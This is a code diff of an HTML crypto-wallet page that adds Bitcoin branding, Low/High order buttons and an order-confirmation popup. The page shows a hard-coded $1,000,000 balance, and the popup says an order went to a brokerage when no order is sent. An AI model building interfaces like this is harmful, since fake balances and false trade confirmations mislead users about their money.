@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>iOS Wallet App</title>
+  <title>Bitcoin Wallet</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <style>
     body {
@@ -18,7 +18,7 @@
       padding: 25px 20px;
       width: 92%;
       max-width: 500px;
-      margin: 20px auto;
+      margin: 20px auto 80px auto;
       box-shadow: 0 0 10px rgba(0,0,0,0.4);
     }
     .login-input {
@@ -38,15 +38,6 @@
       border: none;
       border-radius: 8px;
       font-size: 17px;
-    }
-    .logout-btn {
-      margin-top: 20px;
-      background: #f44336;
-      padding: 10px;
-      border: none;
-      color: #fff;
-      border-radius: 8px;
-      width: 100%;
     }
     .hidden { display: none; }
 
@@ -109,6 +100,41 @@
       height: 400px;
       margin-top: 20px;
     }
+
+    .btc-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+
+    .btc-header img {
+      width: 30px;
+    }
+
+    .btc-header span {
+      font-size: 18px;
+      font-weight: 500;
+    }
+
+    .order-buttons {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 15px;
+    }
+
+    .order-buttons button {
+      flex: 1;
+      margin: 0 5px;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+    }
+
+    .low-btn { background: #e53935; color: white; }
+    .high-btn { background: #43a047; color: white; }
   </style>
 </head>
 <body>
@@ -132,13 +158,20 @@
 </div>
 
 <div class="container hidden" id="dashboard">
-  <h2>Wallet Dashboard</h2>
+  <div class="btc-header">
+    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=025" alt="BTC" />
+    <span>Bitcoin Dashboard</span>
+  </div>
   <div class="wallet-info" id="walletAddress">Not connected</div>
   <div class="balance">Balance: $1,000,000.00</div>
   <button class="login-button" onclick="connectWallet()">Connect Wallet</button>
-  <button class="logout-btn" onclick="logout()">Logout</button>
 
-  <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
+  <div class="order-buttons">
+    <button class="low-btn" onclick="showNotice('Low')">Low</button>
+    <button class="high-btn" onclick="showNotice('High')">High</button>
+  </div>
+
+  <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=30&theme=dark&style=3&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
 </div>
 
 <div class="footer hidden" id="footerNav">
@@ -151,8 +184,8 @@
   <div class="footer-btn" onclick="alert('Transactions Coming Soon')">
     <i class="fas fa-list-alt"></i>Transactions
   </div>
-  <div class="footer-btn" onclick="alert('Settings Coming Soon')">
-    <i class="fas fa-cog"></i>Settings
+  <div class="footer-btn" onclick="logout()">
+    <i class="fas fa-cog"></i>Logout
   </div>
 </div>
 
@@ -162,7 +195,7 @@
     <h3>Deposit</h3>
     <input type="number" class="login-input" placeholder="Amount" />
     <button class="login-button">Confirm</button>
-    <button class="logout-btn" onclick="closeModal('depositModal')">Close</button>
+    <button class="login-button" onclick="closeModal('depositModal')">Close</button>
   </div>
 </div>
 
@@ -172,7 +205,16 @@
     <h3>Withdraw</h3>
     <input type="number" class="login-input" placeholder="Amount" />
     <button class="login-button">Confirm</button>
-    <button class="logout-btn" onclick="closeModal('withdrawModal')">Close</button>
+    <button class="login-button" onclick="closeModal('withdrawModal')">Close</button>
+  </div>
+</div>
+
+<!-- Notice Modal -->
+<div class="modal" id="noticeModal">
+  <div class="modal-content">
+    <h3>Order Placed</h3>
+    <p id="noticeText"></p>
+    <button class="login-button" onclick="closeModal('noticeModal')">OK</button>
   </div>
 </div>
 
@@ -227,6 +269,11 @@
 
   function closeModal(id) {
     document.getElementById(id).style.display = 'none';
+  }
+
+  function showNotice(orderType) {
+    document.getElementById('noticeText').innerText = `Your "${orderType}" order has been sent to your brokerage.`;
+    openModal('noticeModal');
   }
 
   async function connectWallet() {
